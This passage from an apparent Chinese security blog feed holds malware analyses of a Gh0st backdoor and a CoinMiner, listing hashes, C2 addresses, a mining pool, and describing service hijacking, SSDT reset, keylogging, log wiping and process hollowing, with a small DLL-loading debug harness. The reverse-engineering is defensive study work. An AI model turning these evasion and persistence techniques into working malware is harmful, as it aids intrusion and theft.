</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2600多行的代码调试起来相当麻烦，所以我先对其下断点，首先是递归函数，一个断点，有个rename<br>下一个断点，剩下是关于WriteFile下断，以及其他的重要的函数(PS:还要下一个硬件断点，emmmm忘记在哪里了)如图：<br>    <img src="https://i.imgur.com/7ly3gg7.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;每当停下来的时候，就可以利用IDA查看交叉引用了。查看数据流的过程。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;病毒分析很心酸，真的会秃头。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这个是关于Criakl勒索病毒安全预警：&lt;a href=&quot;https://baijiahao.baidu.com/s?id=1621544930994823264&amp;amp;wfr=spider&amp;amp;for=pc&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://baijiahao.baidu.com/s?id=1621544930994823264&amp;amp;wfr=spider&amp;amp;for=pc&lt;/a&gt;感谢这些安全专家吧，唉。不说了。头发真的都掉完了~~~&lt;/p&gt;
&lt;h1 id=&quot;一：目录&quot;&gt;&lt;a href=&quot;#一：目录&quot; class=&quot;headerlink&quot; title=&quot;一：目录&quot;&gt;&lt;/a&gt;一：目录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1.目录&lt;/li&gt;
&lt;li&gt;2.Ioc&lt;/li&gt;
&lt;li&gt;3.行为分析&lt;/li&gt;
&lt;li&gt;4.样本分析&lt;/li&gt;
&lt;li&gt;5.技术总结
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术18) ---Ghost后门病毒</title>
    <link href="http://yoursite.com/2019/01/13/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF_19_Ghost%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/01/13/病毒分析技术_19_Ghost后门程序分析/</id>
    <published>2019-01-13T03:02:11.000Z</published>
    <updated>2019-02-06T15:00:13.031Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;后门病毒的前缀是：Backdoor。该类病毒的特性是通过网络传播，给系统开后门，给用户电脑带来安全隐患。2004年年初，IRC后门病毒开始在全球网络大规模出现。一方面有潜在的泄漏本地信息的危险，另一方面病毒出现在局域网中使网络阻塞，影响正常工作，从而造成损失。即使管理员通过改变所有密码之类的方法来提高安全性，仍然能再次侵入，使再次侵入被发现的可能性减至最低。<br>大多数后门设法躲过日志，大多数情况下即使入侵者正在使用系统也无法显示他已在线。<strong>摘录于百度百科</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此次病毒多次使用隐藏技术，反复转移文件，以及使用Hook技术对抗分析。但是美中不足的是，释放样本的时候没有加密资源，直接获得了payload。</p><h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.目录</li><li>2.Ioc</li><li>3.行为分析</li><li>4.样本分析</li><li>5.技术总结<a id="more"></a></li></ul><h1 id="二：IoC"><a href="#二：IoC" class="headerlink" title="二：IoC"></a>二：IoC</h1><h2 id="2-1：样本1"><a href="#2-1：样本1" class="headerlink" title="2.1：样本1"></a>2.1：样本1</h2><ul><li>1.样本名称：DD668456CF2F3B72773D1968487BDCD5</li><li>2.样本md5：dd668456cf2f3b72773d1968487bdcd5</li><li>3.是否加壳：Microsoft Visual C++ 6.0 [Overlay]</li><li>4.编译语言：vc++</li><li>5.样本来源：来自于网络收集</li></ul><h2 id="2-2：样本2"><a href="#2-2：样本2" class="headerlink" title="2.2：样本2"></a>2.2：样本2</h2><ul><li>1.样本名称：netsvcs_0x0ex1.dll</li><li>2.样本md5：5b047ba6518480625dcbe5a14e10dc87</li><li>3.是否加壳：Microsoft Visual C++ ver. 6/7 DLL  </li><li>4.编译语言：vc++</li><li>5.样本来源：样本1释放而来</li></ul><h1 id="三：行为分析"><a href="#三：行为分析" class="headerlink" title="三：行为分析"></a>三：行为分析</h1><ul><li>行为分析如下：<br>  <img src="https://i.imgur.com/IaeYW2r.png" alt=""><h1 id="四：样本分析"><a href="#四：样本分析" class="headerlink" title="四：样本分析"></a>四：样本分析</h1><h2 id="4-1-样本1"><a href="#4-1-样本1" class="headerlink" title="4.1 样本1"></a>4.1 样本1</h2></li><li>1.首先读取进程镜像文件中倒数1024个字节，这些内容部分然后使用base和普通运算加密形成以后的服务名称Microsoft Device Manager。<br>  <img src="https://i.imgur.com/MzD2jC6.png" alt=""><br>  <img src="https://i.imgur.com/9r5LLbB.png" alt=""><br>  <img src="https://i.imgur.com/uqXrVG8.png" alt=""></li><li>2.判断参数是否是<code>Gh0st Update</code>，如果不是立即退出进程</li><li>3.当程序参数为<code>Gh0st Update</code>,首先判断添加ACE到指定的ACL，目的用于控制访问数据流量。<br>  <img src="https://i.imgur.com/hx7fOkO.png" alt=""><br>  <img src="https://i.imgur.com/moDwHW0.png" alt=""></li><li>4.接下来释放一个tmp文件，然后找到他的导出表，执行ResetSSDT，初步怀疑重置SSDT是为了干扰安全软件的分析和查杀，尤其是一些主动防御的安全软件。具体步骤是这样的:<ul><li>首先遍历资源文件，释放其中的bin文件命名为res.tmp，然后移动文件命名为ex.tmp设置一个新的文件时间以及隐藏属性并删除之前的res.tmp。<br><img src="https://i.imgur.com/IBk8AFJ.png" alt=""><br><img src="https://i.imgur.com/qKbbV8S.png" alt=""><br><img src="https://i.imgur.com/qrGz7Pl.png" alt=""></li><li>获取其中的ResetSSDT函数并调用<br><img src="https://i.imgur.com/6ykz9Iq.png" alt=""><br><img src="https://i.imgur.com/aOwTY3S.png" alt=""></li></ul></li><li>5.接下来，创建名为Microsoft Device Manager的服务，具体的步骤如下：<ul><li>首先读取CurrentVersion\Svchost下netsvcs项的内容x，然后读取SYSTEM\CurrentControlSet\Services\x，并删除C:\WINDOWS\system32\xex.dll这个文件，以便替换，替换成netsvcs_0x0ex.dll<br><img src="https://i.imgur.com/k6lxsxc.png" alt=""></li><li>然后创建一个名为Microsoft Device Manager的服务<br><img src="https://i.imgur.com/5n41iq7.png" alt=""></li><li>创建互斥体，目的是保证实例唯一性<br><img src="https://i.imgur.com/Ac78V5P.png" alt=""></li></ul></li><li>6.然后将之前的ex.tmp文件写入名为<code>SYSTEM\CurrentControlSet\Services\netsvcs_0x0</code>的项InstallModule的内容。接下来就开启服务<br>  <img src="https://i.imgur.com/wXuSzd6.png" alt=""><br>  <img src="https://i.imgur.com/klioO5T.png" alt=""><h2 id="4-2-样本2"><a href="#4-2-样本2" class="headerlink" title="4.2 样本2"></a>4.2 样本2</h2></li><li><p>1.首先这个是一个dll文件，根据之前的分析，我们需要调试服务，首先我们不能用OD自带的loaddll因为这默认的入口点是dllMain函数，而调式服务的入口点是ServiceMain函数，我们利用GetProcAddress函数获取函数地址，然后调用即可。代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">HMODULE hModule=<span class="literal">NULL</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> ServiceName[]=<span class="string">"ServiceName2"</span>; </div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> *ServiceName3=ServiceName;</div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(*Fun)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span>**)</span></span>;</div><div class="line">hModule = LoadLibrary(<span class="string">"netsvcs_0x0ex.dll"</span>);</div><div class="line"><span class="keyword">if</span>(hModule==<span class="literal">NULL</span>)</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Load Dll Fail"</span>); </div><div class="line">Fun ServiceMain=(Fun)GetProcAddress(hModule,<span class="string">"ServiceMain"</span>); </div><div class="line">ServiceMain(<span class="number">1</span>,&amp;ServiceName3);</div><div class="line">getchar();</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div></pre></td></tr></table></figure></li><li><p>2.首先挂起服务，将dwCheckPoint成员设置为0，表示挂起服务或者服务暂停。<br>   <img src="https://i.imgur.com/Mo7Dv86.png" alt=""></p></li><li>3.获取\CurrentControlSet\Services\ServiceName2的Type子项下的内容，如果内容为288，则在后门执行完毕后进入休眠状态。<br>   <img src="https://i.imgur.com/LV7mMBB.png" alt=""><br>   <img src="https://i.imgur.com/Ae1wLuc.png" alt=""></li><li>4.读取文件中最后1024个字节内容，这是为了验证是否为正确的恶意文件。以及创建新的互斥量和Ipaddress。<br>  <img src="https://i.imgur.com/THOiI1K.png" alt=""></li><li>5.如果服务存在，需要重置SSDT以及修改服务子项Type的内容为288，接着删除删除InstallModule键内容，删除InstallModule对应的文件<br>  <img src="https://i.imgur.com/IYn2nz4.png" alt=""><br>  <img src="https://i.imgur.com/ntbltUk.png" alt=""></li><li>6.将之前从文件中获取<code>rqaxva61p72uvaenqaevp6ef</code>经过Base64以及普通加密运算得到Ipaddress<code>192.168.1.88:8088</code><br>  <img src="https://i.imgur.com/HuV5CR5.png" alt=""><br>  <img src="https://i.imgur.com/I0VVY4T.png" alt=""><br>  <img src="https://i.imgur.com/8QfkQLs.png" alt=""></li><li>7.接着通过之前编码的Ipaddress<code>192.168.1.88:8088</code>进行链接，然后利用socket进行信息传输<br>  <img src="https://i.imgur.com/wq3lW4C.png" alt=""><br>  <img src="https://i.imgur.com/Q7tWnLv.png" alt=""><br>  <img src="https://i.imgur.com/r4WJGPY.png" alt=""></li><li>8.然后获取系统相关信息，主要用系统版本，主机名，CPU频率，驱动信息，然后将这些数据发送给病毒作者服务器。<br>  <img src="https://i.imgur.com/afk7zOo.png" alt=""><br>  <img src="https://i.imgur.com/ummL3AD.png" alt=""><ul><li>系统版本信息<br><img src="https://i.imgur.com/3rtqGPM.png" alt=""></li><li>主机名：<br><img src="https://i.imgur.com/F7sAgeq.png" alt=""></li><li>CPU频率<br><img src="https://i.imgur.com/VmPzJ2W.png" alt=""></li><li>驱动信息<br><img src="https://i.imgur.com/OKdLpVw.png" alt=""></li></ul></li><li><p>9.病毒的后门控制模块有以下功能：</p><ul><li>1.主要是获取磁盘和文件信息<br><img src="https://i.imgur.com/9d6ylbb.png" alt=""><br><img src="https://i.imgur.com/4FaKHSE.png" alt=""></li><li>2.屏幕控制(包含视屏和音频)<br><img src="https://i.imgur.com/YMxNQvr.png" alt=""><br><img src="https://i.imgur.com/JOQwPAH.png" alt=""><br><img src="https://i.imgur.com/AQcyL8s.png" alt=""><br><img src="https://i.imgur.com/Mngl2Vy.png" alt=""><br><img src="https://i.imgur.com/sW1F4M1.png" alt=""></li><li>3.管道通信读取\syslog_dat数据<br><img src="https://i.imgur.com/vNNXYuF.png" alt=""><br><img src="https://i.imgur.com/Q2KuxTi.png" alt=""><br><img src="https://i.imgur.com/P0corNX.png" alt=""><br><img src="https://i.imgur.com/DjjNZYW.png" alt=""></li><li>4.发送\syslog_dat数据<br><img src="https://i.imgur.com/hfAOIPn.png" alt=""></li><li>5.获取进程的PID，模块信息和进程映像文件<br><img src="https://i.imgur.com/4bGqQUU.png" alt=""><br><img src="https://i.imgur.com/4mVETNE.png" alt=""></li><li>6.提升进程权限为关机权限<br><img src="https://i.imgur.com/UVsCFxZ.png" alt=""><br><img src="https://i.imgur.com/NkL0Zeq.png" alt=""></li><li>7.执行之前释放的文件<br><img src="https://i.imgur.com/82dNtBZ.png" alt=""><br><img src="https://i.imgur.com/fl3sR5S.png" alt=""></li><li>8.Update本地的后门程序<br><img src="https://i.imgur.com/GqV736C.png" alt=""></li><li>9.劫持winlogon.exe，首先判断注册表下services下的内容是否为288，如果是288则删除注册表和文件，如果不是就劫持winlogon.exe，已知winlogon进程随着开机自启而启动，如果劫持了此进程，相当于病毒拥有了自启的功能。<br><img src="https://i.imgur.com/2gKEkjc.png" alt=""><br><img src="https://i.imgur.com/3ZBhxa0.png" alt=""><br><img src="https://i.imgur.com/cvQkVPB.png" alt=""><br><img src="https://i.imgur.com/vqycWUy.png" alt=""><br><img src="https://i.imgur.com/zzJX8RX.png" alt=""></li><li>10.清空软件日志<br><img src="https://i.imgur.com/ZTRXpt4.png" alt=""></li><li>11.打开IE<br><img src="https://i.imgur.com/Sb57G2t.png" alt=""><br><img src="https://i.imgur.com/3TbpMGp.png" alt=""></li><li>12.删除Services下的注册表内容<br><img src="https://i.imgur.com/KZHvBHw.png" alt=""></li><li>13.钩取特殊字符信息，fn是一个回调函数，保存于syslog<br><img src="https://i.imgur.com/fpa8efZ.png" alt=""><br><img src="https://i.imgur.com/P0JapBj.png" alt=""><br><img src="https://i.imgur.com/oEMEsPn.png" alt=""><br><img src="https://i.imgur.com/DcQvObl.png" alt=""><h1 id="五：技术总结"><a href="#五：技术总结" class="headerlink" title="五：技术总结"></a>五：技术总结</h1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;技术是招式，编程是内功，所以以后的分析我尽可能总结点编程的东西，而不单单只是分析。这样才能更好的帮助我们理解分析。<h2 id="socket编程基础"><a href="#socket编程基础" class="headerlink" title="socket编程基础"></a>socket编程基础</h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WinSock 编程的第一步就是加载 ws2_32.dll，然后调用 WSAStartup() 函数进行初始化，并指明要使用的版本号。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来就是创建套接字的过程，使用socket()函数创建套接字。函数原型如下：<code>int socket( int af, int type, int protocol)</code>。在windows创建套接字<code>SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);  //创建TCP套接字</code>或者<code>SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);  //创建UDP套接字</code></li></ul></li><li><p>参数af的意思是Address Family，也就是IP地址类型，有两种形式 AF_INET 和 AF_INET6，表示IPV4和IPV6，</p></li><li>参数Type有两种，常用的有SOCK_STREAM 和 SOCK_DGRAM,分别是有连接的和无连接的。 </li><li>参数protocol表示传输协议，常用的有 IPPROTO_TCP 和 IPPTOTO_UDP，分别表示 TCP 传输协议和 UDP 传输协议。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后在客户端用connect函数去连接，服务端用bind()去绑定。在windows下连接的方法如下:<code>int connect(SOCKET sock, const struct sockaddr *serv_addr, int addrlen);  //Windows</code>  </li><li>参数sock是之前创建的套接字句柄</li><li>参数serv_addr是sockaddr 结构体变量的指针</li><li><p>参数addrlen是addr变量的大小<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中第二个参数最重要，他指向的结构体sockaddr_in如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span>&#123;</span></div><div class="line">    <span class="keyword">sa_family_t</span>     sin_family;   <span class="comment">//地址族（Address Family），也就是地址类型</span></div><div class="line">    <span class="keyword">uint16_t</span>        sin_port;     <span class="comment">//16位的端口号</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span>  <span class="title">sin_addr</span>;</span>     <span class="comment">//32位IP地址</span></div><div class="line">    <span class="keyword">char</span>            sin_zero[<span class="number">8</span>];  <span class="comment">//不使用，一般用0填充</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></li><li><p>其中sin_addr是struct in_addr结构体类型的变量。之所以在结构体里面套用一个结构体而不直接用变量s_addr是因为需要兼顾之前的版本情况。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">struct in_addr&#123;</div><div class="line">    in_addr_t  s_addr;  <span class="comment">//32位的IP地址</span></div><div class="line">&#125;;</div><div class="line">```  </div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;然后是发送和接收数据，在windows下，使用send发送数据，原型如下：它的原型为：</div><div class="line">`int send(SOCKET sock, const char *buf, int len, int flags);`以及使用recv函数接收数据`int recv(SOCKET sock, char *buf, int len, int flags);`要注意客户端和服务端是相对的，也就是说客服端不单单只是发送数据也存在接收数据的函数。</div><div class="line">* 参考资料：[http:<span class="comment">//c.biancheng.net/cpp/html/3038.html](http://c.biancheng.net/cpp/html/3038.html)</span></div><div class="line"><span class="meta">## C++虚函数分析</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;所谓虚函数，就是在某基类中声明为virtual，并在一个或多个派生类中被重新定义的成员函数。用于实现多态性，通过指向派生类的基类指针，访问派生类中同名覆盖成员函数。也就是说，在编译的时候并不知道会调用那个函数，确定函数的真实调用过程是动态的。  </div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;如下代码，运行结果是`fn in A</div><div class="line">virtual fn in B`.为什么会产生这样的结果呢，因为A类是基类，B类是派生类。首先创建了A类，当调用fn()这个常规成员函数的时候，直接调用即可。但是调用v_fn的时候，由于v_fn是一个虚函数。会事先判断B类这个派生类的v_fn是否可用，可用的话直接调用B类的v_fn。</div></pre></td></tr></table></figure></li></ul><p>class A {<br>public:<br>    void fn() { printf(“fn in A\n”); }<br>    virtual void v_fn() { printf(“virtual fn in A\n”); }<br>};<br>class B : public A {<br>public:<br>    void fn() { printf(“fn in B\n”); }<br>    virtual void v_fn() { printf(“virtual fn in B\n”); }<br>};<br>int main() {<br>    A *a = new B();<br>    a-&gt;fn();<br>    a-&gt;v_fn();<br>    return 0;<br>}<br>```<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如图，虚函数不是一开始就存在的，他是依靠虚函数表指引调用虚函数，每个类如果虚函数大于1都会构建一个虚函数表。事先会使用一个构造函数去动态指向将要调用的虚函数，返回值为函数指针，放入eax中，后期call eax即可。<br>    <img src="https://i.imgur.com/tRdzQYz.png" alt=""><br>     <img src="https://i.imgur.com/zR9RLT5.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;后门病毒的前缀是：Backdoor。该类病毒的特性是通过网络传播，给系统开后门，给用户电脑带来安全隐患。2004年年初，IRC后门病毒开始在全球网络大规模出现。一方面有潜在的泄漏本地信息的危险，另一方面病毒出现在局域网中使网络阻塞，影响正常工作，从而造成损失。即使管理员通过改变所有密码之类的方法来提高安全性，仍然能再次侵入，使再次侵入被发现的可能性减至最低。&lt;br&gt;大多数后门设法躲过日志，大多数情况下即使入侵者正在使用系统也无法显示他已在线。&lt;strong&gt;摘录于百度百科&lt;/strong&gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;此次病毒多次使用隐藏技术，反复转移文件，以及使用Hook技术对抗分析。但是美中不足的是，释放样本的时候没有加密资源，直接获得了payload。&lt;/p&gt;
&lt;h1 id=&quot;一：目录&quot;&gt;&lt;a href=&quot;#一：目录&quot; class=&quot;headerlink&quot; title=&quot;一：目录&quot;&gt;&lt;/a&gt;一：目录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1.目录&lt;/li&gt;
&lt;li&gt;2.Ioc&lt;/li&gt;
&lt;li&gt;3.行为分析&lt;/li&gt;
&lt;li&gt;4.样本分析&lt;/li&gt;
&lt;li&gt;5.技术总结
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术(17) ---CoinMiner挖矿病毒</title>
    <link href="http://yoursite.com/2018/11/15/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF_17_%20CoinMiner%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/"/>
    <id>http://yoursite.com/2018/11/15/病毒分析技术_17_ CoinMiner挖矿病毒/</id>
    <published>2018-11-15T03:02:11.000Z</published>
    <updated>2018-11-16T04:52:39.570Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;偶然在论坛上看到一篇关于CoinMiner介绍，文章从该病毒的流行趋势，入侵路径，关联分析等多个角度对病毒进行的分析，对样本的分析寥寥几句就概括完了。想到之前分析的多为勒索类病毒，对于挖矿类病毒研究较少。故斗胆尝试小小分析一次，如有不到之处望师傅们指教。</p><h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.目录</li><li>2.样本信息</li><li>3.行为分析</li><li>4.样本分析</li><li>5.溯源分析</li></ul><h1 id="二：样本信息"><a href="#二：样本信息" class="headerlink" title="二：样本信息"></a>二：样本信息</h1><ul><li>1.样本名称：antspywares.exe</li><li>2.样本md5：3846b42b7ac29f8f92f6222230207cb5</li><li>3.是否加壳：无壳</li><li>4.编译语言：Microsoft Visual C++ ver. ~6.0~7.10 - Linker 14 - Visual 2015 </li><li>5.样本来源：<a href="http://93.174.93.149/" target="_blank" rel="external">http://93.174.93.149/</a></li></ul><h1 id="三：行为分析"><a href="#三：行为分析" class="headerlink" title="三：行为分析"></a>三：行为分析</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;样本在技术上有所创新，首先没有直接使用Kernel32下的API函数，而是利用Knowdlls注册表优先在家Ntdll，然后获取其中的Nt*函数。第二，使用了进程替换技术，利用svchost.exe这一宿主进程，去启动挖矿进程，这样有效避免的被查杀的风险。但是实际操作中没有有效控制CPU的占用率，导致了被害者很容易觉察到。<br>    <img src="https://i.imgur.com/8mIM5jj.png" alt=""></p><h1 id="四：样本分析"><a href="#四：样本分析" class="headerlink" title="四：样本分析"></a>四：样本分析</h1><ul><li><p>1.程序在执行了初始化操作后，创建了一个名为<code>4e064bee1f3860fd606a</code>的互斥体，这一步目的是保证程序在此主机上是唯一的。如果检测到已存在次互斥体，程序退出。<br>  <img src="https://i.imgur.com/PKjcZEZ.png" alt=""></p></li><li><p>2.通过异或运算，解密得到配置文件地址，通过访问配置文件，我们可以看到钱包地址，矿池等相关配置信息。<br>  <img src="https://i.imgur.com/SBgTHTI.png" alt=""><br>  <img src="https://i.imgur.com/I0iMCaD.png" alt=""><br>  <img src="https://i.imgur.com/ZwU4MNQ.png" alt=""></p></li><li><p>3.再次通过相同的异或运算得到钱包地址，矿池地址<code>pool.monero.hashvault.pro:3333</code><br>  <img src="https://i.imgur.com/g9nRJCl.png" alt=""><br>  <img src="https://i.imgur.com/rpnwyaN.png" alt=""><br>  <img src="https://i.imgur.com/tyZob4d.png" alt=""><br>  <img src="https://i.imgur.com/wOsQMDq.png" alt=""></p></li><li><p>4.对病毒文件进行Hash加密 </p><ul><li>初始化CSP</li><li>创建空的Hash对象</li><li>将文件读入内存</li><li>将读入数据添加到指定Hash对象<br><img src="https://i.imgur.com/amBeAUN.png" alt=""><br><img src="https://i.imgur.com/alU1Uew.png" alt=""></li></ul></li><li><p>5.根据之前获得的系统位数(32位or64位)分别利用注册表<code>KnownDlls32</code>或者<code>KnowDlls</code>注册表项加载ntdll.dll，然后通过GetProcAddress函数获取指定函数地址。这样一来可以直接用Nt*函数，不需要Kernel32分发，也增大了分析人员分析的难度。<br>  <img src="https://i.imgur.com/oTnCKoj.png" alt=""><br>  <img src="https://i.imgur.com/r7rS9HU.png" alt=""></p></li><li><p>6.通过注册表<code>\\SOFTWARE\\Microsoft\\Cryptography</code>获取主机GUID值，目的是唯一的标志主机，在理论上GUID是每台主机唯一拥有的。也就是说每台主机的GUID值是不一样的。<br>  <img src="https://i.imgur.com/0wumWNB.png" alt=""><br>  <img src="https://i.imgur.com/T29WIq7.png" alt=""><br>  <img src="https://i.imgur.com/otkfSVm.png" alt=""><br>  <img src="https://i.imgur.com/JZc0eQc.png" alt=""></p></li><li><p>7.创建病毒释放目录<br>  <img src="https://i.imgur.com/LGFvRuR.png" alt=""><br>  <img src="https://i.imgur.com/dUNDo2k.png" alt=""></p></li><li><p>8.从网络中读取配置信息，可以发现这里的数据和前面的new.txt是一致的<br>  <img src="https://i.imgur.com/hj2CkBq.png" alt=""><br>  <img src="https://i.imgur.com/jElhNmG.png" alt=""><br>  <img src="https://i.imgur.com/0mTfea6.png" alt=""></p></li><li><p>9.判断svchost和wuapp.exe是否存在，这两个文件是系统文件，svchost是服务宿主程序，wuapp用于windows的更新，检查这两个程序存在的目的是为了后期利用这两个程序创建挖矿进程。<br>  <img src="https://i.imgur.com/Q2iq3sY.png" alt=""></p></li><li><p>10.创建两个配置文件<br>  <img src="https://i.imgur.com/DnkROSm.png" alt=""></p></li><li><p>11.在启动目录下创建<code>HpuEtzbXyw.url</code>文件，用于自启动.<br>  <img src="https://i.imgur.com/YFFCeC9.png" alt=""></p></li><li><p>12.创建挖矿进程，这里使用了进程替换技术。首先将代码跨进程写入svchost.exe中，然后通过sysenter汇编关键字resume。<br>  <img src="https://i.imgur.com/T3VFB0U.png" alt=""><br>  <img src="https://i.imgur.com/NPaJQ0r.png" alt=""><br>  <img src="https://i.imgur.com/NDLwOol.png" alt=""><br>  <img src="https://i.imgur.com/tAbDHoC.png" alt=""></p></li></ul><h1 id="五。溯源分析"><a href="#五。溯源分析" class="headerlink" title="五。溯源分析"></a>五。溯源分析</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据管家团队的分析显示8220团队使用多个C&amp;C服务器，这样可以有效的避免被检测到。一下是8220团队使用到的C&amp;C服务器<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">159<span class="selector-class">.65</span><span class="selector-class">.155</span><span class="selector-class">.17</span></div><div class="line">93<span class="selector-class">.174</span><span class="selector-class">.93</span><span class="selector-class">.149</span></div><div class="line">198<span class="selector-class">.50</span><span class="selector-class">.179</span><span class="selector-class">.109</span></div><div class="line">193<span class="selector-class">.169</span><span class="selector-class">.252</span><span class="selector-class">.253</span></div><div class="line">192<span class="selector-class">.99</span><span class="selector-class">.142</span><span class="selector-class">.235</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同时样本中使用到的矿池地址是<code>pool.monero.hashvault.pro:3333</code>发现和其他厂商团队所报告的不符，可能是团队修改了其中的矿池。<br>    <img src="https://i.imgur.com/qwMBeVt.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;偶然在论坛上看到一篇关于Coin
      
    
    </summary>
    
